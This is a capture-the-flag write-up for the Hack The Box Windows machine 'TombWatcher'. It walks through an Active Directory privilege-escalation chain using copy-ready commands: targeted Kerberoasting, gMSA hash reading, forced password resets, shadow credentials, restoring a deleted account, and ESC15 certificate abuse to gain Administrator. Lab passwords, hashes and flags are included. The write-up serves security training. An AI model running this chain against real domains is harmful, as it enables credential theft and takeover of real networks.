```json
Alias: TombWatcher
Date: 08-06_2025
Platform: Hackthebox
OS: Windows
Difficulty: Medium
Status: Complete
IP: 10.129.207.221
```

# TombWatcher
# Summary

- Placeholder

# Lessons Learnt

* Deleted AD Objects can be useful if check for
 
---

# Information Gathering

As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 19:11 PKT
Nmap scan report for 10.129.207.221
Host is up (0.15s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-08 18:12:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-08T18:13:28+00:00; +4h00m04s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-06-08T18:13:29+00:00; +4h00m04s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-08T18:13:28+00:00; +4h00m04s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-08T18:13:29+00:00; +4h00m04s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-06-08T18:12:48
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 4h00m03s, deviation: 0s, median: 4h00m03s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.34 seconds
```
## Discovered Subdomains
```
best.test.com
```

---
# Enumeration

The path to user seems simple

![[Pasted image 20250608194832.png]]


---

# Exploitation

#### Alfred

To get access to alfred, first let's convert their account into a service account and request their `TGS` then we can crack it.

```bash
./targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' -U user_list
```

```bash
hashcat alfred.hash ~/Documents/Wordlists/rockyou.txt -m 13100
```

| Username | Password   |
| -------- | ---------- |
| alfred   | basketball |

We can then as `alfred` add `alfred` to the group INFRASTRUCTURE. This group has the right to read GMSA Password for the machine account `ANSIBLE_DEV$`

Add to group:
```bash
bloodyAD --host dc01.tombwatcher.htb -u 'alfred' -p 'basketball' --dc-ip $IP -d tombwatcher.htb add groupMember INFRASTRUCTURE alfred
```

```bash
nxc ldap $IP -d tombwatcher.htb --dns-server $IP -u alfred -p 'basketball' --gmsa
```

We get the hash for `ansible_dev$`

| Username     | Hash                             |
| ------------ | -------------------------------- |
| ansible_dev$ | 1c37d00093dc2a5f25176bf2d474afdc |
Now as `ansible_dev$`, we can force change the password of sam and make sam the owner of john, and try to force change john's password or something

```bash
bloodyAD --host dc01.tombwatcher.htb -u 'ansible_dev$' -p ':1c37d00093dc2a5f25176bf2d474afdc' --dc-ip $IP -d tombwatcher.htb set password sam 'P$ssW0rd!23'
```

| Username | Password    |
| -------- | ----------- |
| Sam      | P$ssW0rd!23 |
Make sam owner of john

```bash
bloodyAD --host dc01.tombwatcher.htb -u 'sam' -p 'P$ssW0rd!23' --dc-ip $IP -d tombwatcher.htb set owner john sam
```

Give sam GenericAll over john

```bash
bloodyAD --host dc01.tombwatcher.htb -u 'sam' -p 'P$ssW0rd!23' --dc-ip $IP -d tombwatcher.htb add genericAll john sam
```

add shadow credentials to john

```bash
bloodyAD --host dc01.tombwatcher.htb -u 'sam' -p 'P$ssW0rd!23' --dc-ip $IP -d tombwatcher.htb add shadowCredentials john
```

```bash
gettgtpkinit -cert-pem $(pwd)/P7KhqVrr_cert.pem -key-pem $(pwd)/P7KhqVrr_priv.pem tombwatcher.htb/john $(pwd)/P7KhqVrr.ccache
```

Get nt hash 

```bash
getnthash -key '95ea7efa2a0d2f742627c28445877dcf53a5ad177787a6596dc4fdc05f2455d4' -dc-ip $IP 'tombwatcher.htb/john'
```

| Username | Hash                             |
| -------- | -------------------------------- |
| john     | ad9324754583e3e42b55aad4d3b8d2bf |

We now have user

```bash
evil-winrm -i $IP -u john -H 'ad9324754583e3e42b55aad4d3b8d2bf'
```

---

# Lateral Movement

Looking around, I found that a AD user named cert_admin has been deleted, we can see this if as john we run

```powershell
Import-Module ActiveDirectory
Get-ADObject -Filter 'objectClass -eq "user" -and isDeleted -eq $true' -IncludeDeletedObjects
```

We can restore the `cert_admin` account using their `objectGUID`

```bash
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
```

Run a bloodhound scan again and we can see that

![[Pasted image 20250609005154.png]]

John has GenericAll over ADCS OU as well, meaning we have GenericAll on `cert_admin` due to inheritance.

Give John GenericAll again to make sure the right is inherited
```bash
bloodyAD --host dc01.tombwatcher.htb -u 'john' -p ':ad9324754583e3e42b55aad4d3b8d2bf' --dc-ip $IP -d tombwatcher.htb add genericAll "OU=ADCS,DC=TOMBWATCHER,DC=HTB" john
```

add shadow credentials to `cert_admin`
```bash
certipy shadow -u 'john@tombwatcher.htb' -hashes 'ad9324754583e3e42b55aad4d3b8d2bf' -dc-ip $IP -account 'cert_admin' auto
```

| Username   | Hash                             |
| ---------- | -------------------------------- |
| cert_admin | f87ebf0febd9c4095c68a88928755773 |

Check for ADCS vulnerability with certipy

```bash
certipy find -u 'cert_admin' -hashes 'f87ebf0febd9c4095c68a88928755773' -dc-ip $IP -stdout -vulnerable
```

And we find 

```
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

Vulnerable to ESC15. Which means that the template has the `Application Policies` Certificate extension, which is a legacy feature that allows enrollee's to specify EKUs (what a certificate can be used for). When the DC is trying to figure out what actions a certificate can perform, if the certificate has a `Application Policies` extension, it will check it for any EKUs that it contains and use those rather than the ones in `Enhanced Key Usage`

We can also as mentioned, supply the subject of the certificate pretty much allowing us to say that we are the administrator.

---

# Privilege Escalation


Get a cert claiming we are Administrator
```bash
certipy req -dc-ip $IP -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -u cert_admin@tombwatcher.htb -hashes 'f87ebf0febd9c4095c68a88928755773' -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Client Authentication'
```

Get LDAP Shell

```bash
certipy auth -dc-ip $IP -pfx administrator.pfx -domain tombwatcher.htb -ldap-shell
```
> This only worked for me in the latest version of kali (Got SSL Error otherwise)

Change password of Administrator

```bash
change_password administrator 'P@ssw0rd!23'
```

```bash
evil-winrm -i $IP -u Administrator -H 'P@ssw0rd!23'
```

---

# Flags
- 7fe180946aeabcd6907f70ce5818e02e
- 5cf2774bd8e4ed2abad2e9c7af0aa0f1

#CTF